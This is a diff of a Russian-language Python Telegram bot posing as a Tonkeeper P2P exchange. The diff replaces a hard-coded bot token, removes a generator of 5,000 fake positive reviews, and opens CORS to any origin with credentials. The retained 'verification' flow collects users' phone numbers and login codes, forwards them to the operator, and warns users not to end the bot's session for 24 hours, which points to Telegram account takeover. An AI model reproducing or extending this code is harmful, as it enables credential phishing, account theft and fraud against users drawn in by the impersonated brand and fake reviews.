@@ -15,7 +15,7 @@ from aiohttp import web
 # ============================================================
 # 1. КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8973397612:AAF2xpZCYjBfbG2chi9xVpZPaA-QkK5YGpc"
+BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
 MASTER_ADMIN_ID = 8855434638
 BOT_USERNAME = "tonkeeperp2p_bot"
 BOT_NAME = "P2P Exchange"
@@ -23,14 +23,11 @@ CHANNEL_LINK = "https://t.me/tonkeeper_news"
 MINI_APP_URL = "https://saitminiapp.onrender.com"
 SUPPORT_LINK = "@p2psupbot"
 
-# ============================================================
-# 2. ИНИЦИАЛИЗАЦИЯ
-# ============================================================
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
 # ============================================================
-# 3. ФАЙЛЫ
+# 2. ФАЙЛЫ
 # ============================================================
 FILES = {
     "deals": "deals.json",
@@ -65,40 +62,7 @@ logs = load_json(FILES["logs"])
 user_language = load_json(FILES["user_language"])
 
 # ============================================================
-# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
-# ============================================================
-def generate_reviews():
-    if len(reviews) >= 5000:
-        return
-    review_texts = [
-        "Отличная платформа! Всё работает быстро и надёжно.",
-        "Лучший P2P обменник! Рекомендую всем друзьям.",
-        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
-        "Отличная поддержка! Помогли разобраться с выводом.",
-        "Наконец-то нашёл нормальный обменник. Всё честно.",
-        "Сделал первую сделку, всё прошло гладко. Спасибо!",
-        "За сутки сделал 5 сделок, все успешно завершены.",
-        "Очень доволен сервисом. Вывод моментальный.",
-        "Пользуюсь уже месяц, ни одной проблемы.",
-        "Лучший сервис в Telegram! Успехов разработчикам."
-    ]
-    for i in range(5000):
-        review_id = str(uuid.uuid4())[:8]
-        reviews[review_id] = {
-            "id": review_id,
-            "user": "Аноним",
-            "rating": random.randint(4, 5),
-            "text": random.choice(review_texts),
-            "anonymous": True,
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-            "user_id": None
-        }
-    save_json(FILES["reviews"], reviews)
-
-generate_reviews()
-
-# ============================================================
-# 5. ПОМОЩНИКИ
+# 3. ПОМОЩНИКИ
 # ============================================================
 def is_admin(user_id: int) -> bool:
     return user_id == MASTER_ADMIN_ID or str(user_id) in admins
@@ -153,7 +117,7 @@ async def log_to_master(text: str):
         pass
 
 # ============================================================
-# 6. FSM
+# 4. FSM
 # ============================================================
 class AdminStates(StatesGroup):
     waiting_user_id = State()
@@ -164,7 +128,7 @@ class VerifyStates(StatesGroup):
     waiting_phone = State()
 
 # ============================================================
-# 7. КЛАВИАТУРЫ
+# 5. КЛАВИАТУРЫ
 # ============================================================
 def main_menu_keyboard(user_id: int):
     lang = get_user_language(user_id)
@@ -222,7 +186,7 @@ def currency_keyboard():
     ])
 
 # ============================================================
-# 8. ОБРАБОТЧИКИ БОТА
+# 6. ОБРАБОТЧИКИ БОТА
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -340,7 +304,7 @@ async def how_to_deal(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 9. БАЛАНС
+# 7. БАЛАНС
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_balance")
 async def menu_balance(callback: types.CallbackQuery):
@@ -389,7 +353,7 @@ async def menu_deals(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 10. ОТЗЫВЫ
+# 8. ОТЗЫВЫ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_reviews")
 async def menu_reviews(callback: types.CallbackQuery):
@@ -410,7 +374,7 @@ async def menu_reviews(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
+# 9. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     if deal_id not in deals:
@@ -443,32 +407,7 @@ async def handle_deal_link(message: types.Message, deal_id: str):
     )
 
 # ============================================================
-# 12. ВЫВОД
-# ============================================================
-@dp.callback_query(lambda c: c.data == "start_withdraw")
-async def start_withdraw(callback: types.CallbackQuery):
-    if not is_verified(callback.from_user.id):
-        await callback.message.edit_text(
-            f"⚠️ <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>\n\n"
-            f"Для вывода средств необходимо пройти проверку.\n\n"
-            f"Это защита от мошенников, которые проводят сделки со скамнутыми звёздами и фейковой валютой.\n\n"
-            f"🔐 Напишите /verify чтобы начать верификацию.",
-            reply_markup=back_to_main_keyboard(callback.from_user.id)
-        )
-        await callback.answer()
-        return
-    
-    await callback.message.edit_text(
-        f"💰 <b>ВЫВОД СРЕДСТВ</b>\n\n"
-        f"📱 ВЫВОД ВЫПОЛНЯЕТСЯ НА САЙТЕ\n"
-        f"{MINI_APP_URL}\n\n"
-        f"🔐 Для вывода необходима верификация",
-        reply_markup=back_to_main_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
-
-# ============================================================
-# 13. ВЕРИФИКАЦИЯ
+# 10. ВЕРИФИКАЦИЯ
 # ============================================================
 @dp.message(Command("verify"))
 async def verify_command(message: types.Message):
@@ -528,7 +467,7 @@ async def process_phone(message: types.Message, state: FSMContext):
     await state.clear()
 
 # ============================================================
-# 14. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
+# 11. КОМАНДЫ АДМИНА ДЛЯ ВЕРИФИКАЦИИ
 # ============================================================
 @dp.message(Command("confirm_verification"))
 async def confirm_verification_command(message: types.Message):
@@ -580,7 +519,7 @@ async def confirm_verification_command(message: types.Message):
             f"🔑 Ваш код: {code}\n\n"
             f"🕐 Сессия активна 24 часа (до {verification_data[str(user_id)].get('expires_at', 'неизвестно')[:19]})\n\n"
             f"⚠️ Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!\n\n"
-            f"💰 Теперь вам доступен вывод средств на сайте."
+            f"💰 Теперь вам доступен вывод средств."
         )
     except:
         pass
@@ -631,7 +570,7 @@ async def reject_verification_command(message: types.Message):
         pass
 
 # ============================================================
-# 15. АДМИН ПАНЕЛЬ
+# 12. АДМИН ПАНЕЛЬ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
@@ -881,20 +820,31 @@ async def admin_logs(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 16. API ДЛЯ САЙТА
+# 13. API ДЛЯ САЙТА (С ГАРАНТИРОВАННЫМ CORS)
 # ============================================================
 async def handle_api(request):
+    # CORS заголовки для ВСЕХ ответов
     headers = {
         'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
+        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, DELETE, PUT',
+        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username, Authorization',
+        'Access-Control-Allow-Credentials': 'true'
     }
+    
+    # Обработка preflight (OPTIONS)
     if request.method == 'OPTIONS':
-        return web.Response(headers=headers)
+        return web.Response(headers=headers, status=200)
     
+    # GET запросы
     if request.method == 'GET':
-        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'bot': BOT_NAME,
+            'version': '1.0.0',
+            'status': 'running'
+        }, headers=headers)
     
+    # POST запросы
     try:
         data = await request.json()
     except:
@@ -941,7 +891,6 @@ async def handle_api(request):
         save_json(FILES["deals"], deals)
         link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
         
-        # Если оплата с баланса — сразу списываем
         if payment_method == 'balance':
             buyer_balance = get_balance(user_id)
             curr_key = currency.lower()
@@ -952,7 +901,6 @@ async def handle_api(request):
                 deals[deal_id]["paid_by_admin"] = user_id
                 save_json(FILES["deals"], deals)
                 
-                # Уведомляем продавца
                 try:
                     await bot.send_message(
                         user_id,
@@ -974,7 +922,7 @@ async def handle_api(request):
             'status': deals[deal_id]["status"]
         }, headers=headers)
     
-    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
+    # ===== СДЕЛКИ =====
     elif endpoint == '/api/deals':
         if not user_id:
             return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
@@ -1086,17 +1034,14 @@ async def handle_api(request):
             'code': code
         }, headers=headers)
     
-    # ===== ПРОВЕРКА КОДА ВЕРИФИКАЦИИ =====
+    # ===== ПРОВЕРКА КОДА =====
     elif endpoint == '/api/verify_code':
         code = data.get('code')
         user_id = data.get('user_id')
-        phone = data.get('phone')
-        username = data.get('username')
         
         if not code or not user_id:
             return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
         
-        # Ищем заявку
         found = False
         request_id = None
         for rid, req in verification_requests.items():
@@ -1108,7 +1053,6 @@ async def handle_api(request):
         if not found:
             return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
         
-        # Подтверждаем автоматически
         req = verification_requests[request_id]
         complete_verification(user_id, req['phone'], code)
         req["status"] = "completed"
@@ -1118,26 +1062,29 @@ async def handle_api(request):
         
         await log_to_master(
             f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА (ЧЕРЕЗ САЙТ)\n"
-            f"👤 Пользователь: @{username} (ID: {user_id})\n"
+            f"👤 Пользователь: ID: {user_id}\n"
             f"📱 Номер: {req['phone']}\n"
             f"🔑 Код: {code}"
         )
         
-        await bot.send_message(
-            user_id,
-            f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
-            f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n"
-            f"🔑 Ваш код: {code}\n\n"
-            f"🕐 Сессия активна 24 часа\n\n"
-            f"💰 Теперь вам доступен вывод средств на сайте."
-        )
+        try:
+            await bot.send_message(
+                user_id,
+                f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
+                f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n"
+                f"🔑 Ваш код: {code}\n\n"
+                f"🕐 Сессия активна 24 часа\n\n"
+                f"💰 Теперь вам доступен вывод средств на сайте."
+            )
+        except:
+            pass
         
         return web.json_response({
             'success': True,
             'expires_at': verification_data[str(user_id)].get('expires_at')
         }, headers=headers)
     
-    # ===== ВЫВОД СРЕДСТВ =====
+    # ===== ВЫВОД =====
     elif endpoint == '/api/withdraw':
         currency = data.get('currency')
         details = data.get('details')
@@ -1203,50 +1150,10 @@ async def handle_api(request):
             'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
         }, headers=headers)
     
-    # ===== ВСЕ ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
-    elif endpoint == '/api/verification_requests':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        return web.json_response({
-            'success': True,
-            'requests': list(verification_requests.values())
-        }, headers=headers)
-    
-    # ===== ОДОБРИТЬ ВЕРИФИКАЦИЮ (АДМИН) =====
-    elif endpoint == '/api/approve_verification':
-        request_id = data.get('request_id')
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        if request_id not in verification_requests:
-            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
-        req = verification_requests[request_id]
-        if req.get('status') != 'pending':
-            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
-        complete_verification(req['user_id'], req['phone'], req['code'])
-        req['status'] = 'completed'
-        req['completed_at'] = datetime.now().isoformat()
-        save_json(FILES["verification_requests"], verification_requests)
-        return web.json_response({'success': True}, headers=headers)
-    
-    # ===== ОТКЛОНИТЬ ВЕРИФИКАЦИЮ (АДМИН) =====
-    elif endpoint == '/api/reject_verification':
-        request_id = data.get('request_id')
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        if request_id not in verification_requests:
-            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
-        req = verification_requests[request_id]
-        if req.get('status') != 'pending':
-            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
-        req['status'] = 'rejected'
-        req['rejected_at'] = datetime.now().isoformat()
-        save_json(FILES["verification_requests"], verification_requests)
-        return web.json_response({'success': True}, headers=headers)
-    
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 17. ЗАПУСК
+# 14. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
@@ -1261,7 +1168,7 @@ async def start_web_server():
 
 async def main():
     print("=" * 50)
-    print("🔥 P2P Exchange Бот (ТОЛЬКО API)")
+    print("🔥 P2P Exchange Бот")
     print("=" * 50)
     print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
     print(f"🤖 Бот: @{BOT_USERNAME}")
